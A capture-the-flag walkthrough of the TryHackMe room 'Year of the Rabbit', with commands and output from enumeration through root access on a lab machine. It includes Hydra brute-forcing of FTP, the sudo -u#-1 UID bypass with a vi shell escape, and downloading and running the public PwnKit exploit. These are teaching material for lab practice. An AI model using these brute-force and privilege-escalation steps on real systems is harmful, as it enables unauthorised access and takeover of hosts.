# TryHackMe: Year of the Rabbit Walkthrough

Room: https://tryhackme.com/room/yearoftherabbit  
Theme: Time to enter the warren...

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: [https://github.com/garthheff/CTF-Hints/](https://github.com/garthheff/CTF-Hints/blob/main/yearoftherabbit.md

---

## Enumeration

We start with a full TCP port scan and service detection. The target exposes FTP, SSH, and HTTP.

```text
root@ip-10-49-116-104:~# nmap -sV -p- 10.49.177.7
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-30 04:39 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.49.177.7
Host is up (0.00018s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.51 seconds
```

The interesting first target is HTTP on port 80. Looking at the page source shows a stylesheet being loaded from `assets/style.css`.

```text
view-source:http://10.49.177.7/

<link rel="stylesheet" href="assets/style.css" type="text/css">
```

Checking the stylesheet source reveals a comment with the next path to visit.

```text
view-source:http://10.49.177.7/assets/style.css

  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```

## Following the web trail

Opening `/sup3r_s3cr3t_fl4g.php` in the browser results in a Rickroll, but using `curl -v` lets us see the HTTP redirect before the browser follows it.

```text
 root@ip-10-49-116-104:~# curl -v http://10.49.177.7/sup3r_s3cr3t_fl4g.php
*   Trying 10.49.177.7:80...
* TCP_NODELAY set
* Connected to 10.49.177.7 (10.49.177.7) port 80 (#0)
> GET /sup3r_s3cr3t_fl4g.php HTTP/1.1
> Host: 10.49.177.7
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Thu, 30 Apr 2026 03:42:02 GMT
< Server: Apache/2.4.10 (Debian)
< Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 10.49.177.7 left intact
```

The redirect exposes a hidden directory called `/WExYY2Cv-qU`.

```text
http://10.49.177.7/WExYY2Cv-qU/

Index of /WExYY2Cv-qU
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[IMG]	Hot_Babe.png	2020-01-23 00:34	464K	 
Apache/2.4.10 (Debian) Server at 10.49.177.7 Port 80
```

Download the image for local inspection.

```text
root@ip-10-49-116-104:~# wget http://10.49.177.7/WExYY2Cv-qU/Hot_Babe.png
--2026-04-30 04:43:42--  http://10.49.177.7/WExYY2Cv-qU/Hot_Babe.png
Connecting to 10.49.177.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 475075 (464K) [image/png]
Saving to: ‘Hot_Babe.png’

Hot_Babe.png                               100%[======================================================================================>] 463.94K  --.-KB/s    in 0.004s  

2026-04-30 04:43:42 (101 MB/s) - ‘Hot_Babe.png’ saved [475075/475075]
```

## Extracting FTP credential candidates from the image

Running `strings` against the image reveals an FTP username and a list of possible passwords near the bottom of the output.

```text
strings Hot_Babe.png
```

The interesting section contains the FTP username and many password candidates. The original password candidates are redacted below.

```text
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
[REDACTED-PASSWORD-CANDIDATE-01]
[REDACTED-PASSWORD-CANDIDATE-02]
[REDACTED-PASSWORD-CANDIDATE-03]

........

[REDACTED-PASSWORD-CANDIDATE-82]
```

Place those candidates into `passwords.txt`, then use Hydra against FTP with the discovered username `ftpuser`.

```text
root@ip-10-49-116-104:~# hydra -l ftpuser -P passwords.txt ftp://10.49.177.7 -V
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-30 04:47:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.49.177.7:21/
[ATTEMPT] target 10.49.177.7 - login "ftpuser" - pass "[REDACTED-PASSWORD-CANDIDATE-01]" - 1 of 82 [child 0] (0/0)
[ATTEMPT] target 10.49.177.7 - login "ftpuser" - pass "[REDACTED-PASSWORD-CANDIDATE-02]" - 2 of 82 [child 1] (0/0)
.......

[ATTEMPT] target 10.49.177.7 - login "ftpuser" - pass "[REDACTED-PASSWORD-CANDIDATE-64]" - 64 of 82 [child 15] (0/0)
[21][ftp] host: 10.49.177.7   login: ftpuser   password: [REDACTED-PASSWORD]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-30 04:47:47
```

## FTP access and credential discovery

The FTP credential does not work for SSH. That tells us the account is likely FTP-only or otherwise not valid for SSH login.

```text
root@ip-10-49-116-104:~# ssh ftpuser@10.49.177.7
The authenticity of host '10.49.177.7 (10.49.177.7)' can't be established.
ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.177.7' (ECDSA) to the list of known hosts.
ftpuser@10.49.177.7's password: 
Permission denied, please try again.
ftpuser@10.49.177.7's password: 
```

FTP login succeeds, and there is a file called `Eli's_Creds.txt`.

```text
root@ip-10-49-116-104:~# ftp 10.49.177.7
Connected to 10.49.177.7.
220 (vsFTPd 3.0.2)
Name (10.49.177.7:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00 secs (951.4581 kB/s)
ftp> exit
221 Goodbye.
root@ip-10-49-116-104:~# cat Eli\'s_Creds.txt 
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

The file contains Brainfuck. Decoding it reveals the SSH credentials for `eli`.

```text
User: eli
Password: [REDACTED-PASSWORD]
```

One way to decode it is with an online Brainfuck translator, such as the one at `md5decrypt.net/en/Brainfuck-translator/`. A local interpreter would also work.

## SSH as eli

Using the decoded credentials, SSH login as `eli` succeeds. On login, there is a message from root to Gwendoline.

```text
root@ip-10-49-116-104:~# ssh eli@10.49.177.7
eli@10.49.177.7's password: 


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

eli@year-of-the-rabbit:~$ 
```

The message hints at a `s3cr3t` location. We can search the filesystem for paths containing that string.

```text
eli@year-of-the-rabbit:/$ find / -path '*s3cr3t*' -ls 2>/dev/null
 36976    4 -rw-r--r--   1 eli      eli            78 Jan 23  2020 /var/www/html/sup3r_s3cr3t_fl4g.php
137186    4 drwxr-xr-x   2 root     root         4096 Jan 23  2020 /usr/games/s3cr3t
 36980    4 -rw-r--r--   1 root     root          138 Jan 23  2020 /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

Inside `/usr/games/s3cr3t` is a hidden message for Gwendoline. It leaks Gwendoline's password.

```text
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just [REDACTED-PASSWORD]
Honestly!

Yours sincerely
   -Root
eli@year-of-the-rabbit:/usr/games/s3cr3t$ 
```

## Switching to gwendoline and reading user.txt

Use `su` with the recovered password to become `gwendoline`.

```text
eli@year-of-the-rabbit:~$ su gwendoline
Password: 
gwendoline@year-of-the-rabbit:/home/eli$ 
```

The user flag is in Gwendoline's home directory.

```text
gwendoline@year-of-the-rabbit:~$ ls
user.txt
gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{REDACTED}
```

## Sudo privilege check

Checking sudo permissions shows that Gwendoline can run `vi` against `/home/gwendoline/user.txt`, but only as a target user matching `(ALL, !root)`.

```text
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$ 
```

At first glance, this rule says Gwendoline can run the command as any user except root. Running the command normally with `sudo` is not enough, because the `!root` restriction blocks a normal root target.

```text
sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$ sudo /usr/bin/vi /home/gwendoline/user.txt
```

The sudo version is old.

```text
gwendoline@year-of-the-rabbit:~$ sudo -V
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
```

## Privilege escalation with sudo UID bypass

This machine is vulnerable to the classic sudo `-u#-1` bypass affecting older sudo versions.

The sudoers rule says Gwendoline can run:

```text
/usr/bin/vi /home/gwendoline/user.txt
```

as any user except root. The bypass works because `sudo -u#-1` asks sudo to run the command as numeric UID `-1`. In vulnerable versions, that UID is not handled correctly. It wraps around internally and is treated as UID `0`, which is root. This bypasses the `!root` restriction.

Run `vi` using the UID bypass.

```text
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Once `vi` opens, press `Esc`, type `:!/bin/bash`, and press Enter. That launches a shell from inside `vi`.

```text
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

[No write since last change]
root@year-of-the-rabbit:/home/gwendoline# whoami
root

root@year-of-the-rabbit:/home/gwendoline# cd /root

root@year-of-the-rabbit:/root# cat root.txt 
THM{REDACTED}
```

That completes the intended route to root.

## Alternative root path: PwnKit from eli

There is also an alternative route to root from the `eli` account using PwnKit. First, check that `pkexec` exists and confirm the architecture.

```text
eli@year-of-the-rabbit:/$ /usr/bin/pkexec --version
pkexec version 0.105
eli@year-of-the-rabbit:/$ uname -m
x86_64
```

Download a PwnKit binary on the attacking box and host it with Python's simple HTTP server.

```text
root@ip-10-49-116-104:~# wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
--2026-04-30 05:18:14--  https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit.1’

PwnKit.1            100%[===================>]  17.62K  --.-KB/s    in 0s      

2026-04-30 05:18:14 (43.4 MB/s) - ‘PwnKit.1’ saved [18040/18040]

root@ip-10-49-116-104:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Pull it down from the target as `eli`, make it executable, and run it.

```text
eli@year-of-the-rabbit:~$ wget http://10.49.116.104:8000/PwnKit
--2026-04-30 05:22:51--  http://10.49.116.104:8000/PwnKit
Connecting to 10.49.116.104:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit                                     100%[========================================================================================>]  17.62K  --.-KB/s   in 0s     

2026-04-30 05:22:52 (60.3 MB/s) - ‘PwnKit’ saved [18040/18040]

eli@year-of-the-rabbit:~$ chmod +x PwnKit 
eli@year-of-the-rabbit:~$ ./P
Pictures/ Public/   PwnKit    
eli@year-of-the-rabbit:~$ ./PwnKit 
root@year-of-the-rabbit:/home/eli# whoami
root
root@year-of-the-rabbit:/home/eli# 
```

This is a valid alternate route, but the sudo `-u#-1` path from `gwendoline` is the cleaner room-specific privilege escalation because it follows the discovered user chain and the sudoers misconfiguration.

## Attack chain summary

1. Full port scan reveals FTP, SSH, and HTTP.
2. Web source points to a stylesheet.
3. Stylesheet comment reveals `/sup3r_s3cr3t_fl4g.php`.
4. `curl -v` exposes a redirect containing a hidden directory.
5. Hidden directory contains `Hot_Babe.png`.
6. `strings` reveals FTP username `ftpuser` and password candidates.
7. Hydra finds the valid FTP password.
8. FTP access gives `Eli's_Creds.txt`.
9. Brainfuck decode gives SSH credentials for `eli`.
10. Login banner hints at a `s3cr3t` hiding place.
11. Hidden file in `/usr/games/s3cr3t` gives Gwendoline's password.
12. `su gwendoline` gives access to `user.txt`.
13. `sudo -l` shows a vulnerable sudo rule using `(ALL, !root)` with old sudo.
14. `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt` bypasses the restriction.
15. `:!/bin/bash` from inside `vi` gives root.
16. `root.txt` is recovered.

## Key takeaways

- Always check page source and linked static files such as CSS and JavaScript.
- Follow redirects manually with tools like `curl -v` when a browser hides useful details.
- Images can contain useful strings or embedded hints, even without deeper steganography.
- FTP credentials do not always equal SSH credentials.
- Decode weird-looking esolang output instead of ignoring it.
- Login banners and local messages are often deliberate CTF breadcrumbs.
- Old sudo versions can make `(ALL, !root)` rules dangerous because of the `-u#-1` UID bypass.
- Editors allowed through sudo, such as `vi`, can often escape into a shell.
